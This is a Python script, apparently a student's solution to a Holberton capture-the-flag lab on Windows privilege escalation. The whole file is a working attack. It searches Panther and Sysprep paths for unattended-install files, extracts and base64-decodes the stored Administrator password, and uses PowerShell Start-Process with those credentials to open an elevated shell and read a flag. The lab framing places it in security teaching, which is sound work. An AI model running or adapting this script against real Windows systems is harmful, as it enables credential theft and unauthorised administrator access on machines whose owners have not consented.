#!/usr/bin/env python3
"""
extract_password.py
--------------------
Windows Privilege Escalation - Unattended Install Files
Repo: holbertonschool-cyber_security
Dir : privilege_escalation_security_win/windows_privsec

Purpose:
    1. Search common Windows locations for leftover unattended-install
       files (sysprep.inf, autounattend.xml, Unattend.xml).
    2. Extract <AdministratorPassword><Value>...</Value> via regex.
    3. Base64-decode the value (Microsoft stores it as the password
       string + "AdministratorPassword" suffix, base64-encoded UTF-16LE).
    4. Use the recovered credentials with `runas` to spawn an elevated
       shell, then read the flag from the Administrator's Desktop.

Run this FROM THE STUDENT SESSION on LAB01 (cmd/PowerShell has access
to a Python interpreter, or run it under WSL/py launcher).
"""

import os
import re
import base64
import subprocess
import sys

# ----------------------------------------------------------------------
# 1. Typical locations for unattended installation files
# ----------------------------------------------------------------------
CANDIDATE_PATHS = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattend.xml",
    r"C:\Windows\Panther\Unattended.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Windows\System32\Sysprep\Panther\Unattend.xml",
    r"C:\Windows\System32\Sysprep\Unattend.xml",
    r"C:\unattend.xml",
    r"C:\Windows\Panther\Unattend\Unattended.xml",
]

# Regex to pull the value out of the <AdministratorPassword> block
PASSWORD_RE = re.compile(
    r"<AdministratorPassword>\s*<Value>(.*?)</Value>", re.IGNORECASE | re.DOTALL
)


def find_unattend_files(paths=CANDIDATE_PATHS):
    """Return list of existing candidate files on disk."""
    found = []
    for p in paths:
        if os.path.isfile(p):
            found.append(p)
            print(f"[+] Found unattended file: {p}")
    if not found:
        print("[-] No unattended install files found in known locations.")
    return found


def extract_encoded_password(filepath):
    """Read a file and return the raw <Value> content, or None."""
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception as e:
        print(f"[!] Could not read {filepath}: {e}")
        return None

    match = PASSWORD_RE.search(content)
    if match:
        return match.group(1).strip()
    return None


def decode_password(encoded_value):
    """
    Sysprep/unattend passwords are Base64 of the UTF-16LE string:
        <password>AdministratorPassword
    Decode and strip the known suffix to recover the plaintext password.
    """
    try:
        raw = base64.b64decode(encoded_value)
        decoded = raw.decode("utf-16-le", errors="ignore")
    except Exception:
        # Not base64 / not the padded format -> return as-is (plaintext)
        return encoded_value

    suffix = "AdministratorPassword"
    if decoded.endswith(suffix):
        decoded = decoded[: -len(suffix)]
    return decoded


def harvest_credentials():
    """Scan all candidate files and return the first decoded password found."""
    for filepath in find_unattend_files():
        encoded = extract_encoded_password(filepath)
        if encoded:
            password = decode_password(encoded)
            print(f"[+] Extracted password from {filepath}: {password}")
            return password
    return None


# ----------------------------------------------------------------------
# 4. Use runas to open an elevated / Administrator session
# ----------------------------------------------------------------------
def spawn_admin_session(username, password, command="cmd.exe"):
    """
    Uses `runas` with the recovered credentials to start an elevated
    session. Native `runas` does not accept a password on the command
    line for security reasons, so we drive it via PowerShell's
    Start-Process -Credential, which does accept an in-memory
    SecureString built at runtime (nothing is written to disk).
    """
    ps_script = f'''
$user = "{username}"
$pass = ConvertTo-SecureString "{password}" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
Start-Process -FilePath "{command}" -Credential $cred
'''
    print(f"[*] Attempting elevated session as {username} via runas/PowerShell ...")
    try:
        subprocess.run(
            ["powershell.exe", "-NoProfile", "-Command", ps_script],
            check=True,
        )
        print("[+] Elevated session launched. Check the new window.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to launch elevated session: {e}")


def read_flag_from_desktop(username="Administrator"):
    """
    Convenience helper: once elevated, look for a flag file on the
    Administrator's Desktop. Run this INSIDE the elevated session
    (e.g. as the command passed to spawn_admin_session), or manually
    from the elevated cmd window with:
        type C:\\Users\\Administrator\\Desktop\\flag.txt
    """
    flag_path = rf"C:\Users\{username}\Desktop\flag.txt"
    if os.path.isfile(flag_path):
        with open(flag_path, "r", errors="ignore") as f:
            flag = f.read().strip()
        print(f"[+] FLAG: {flag}")
        return flag
    print(f"[-] Flag not found at {flag_path} (run this from the elevated session).")
    return None


def main():
    print("=== Windows Unattended Install Credential Harvester ===\n")

    password = harvest_credentials()
    if not password:
        print("[-] No administrator password could be recovered. Exiting.")
        sys.exit(1)

    username = "Administrator"
    print(f"\n[+] Recovered credentials -> {username}:{password}")

    # Launch elevated session; once inside, run this same script (or just
    # read_flag_from_desktop()) to grab the flag.
    spawn_admin_session(
        username,
        password,
        command='cmd.exe /k python extract_password.py --read-flag',
    )


if __name__ == "__main__":
    if "--read-flag" in sys.argv:
        read_flag_from_desktop()
    else:
        main()
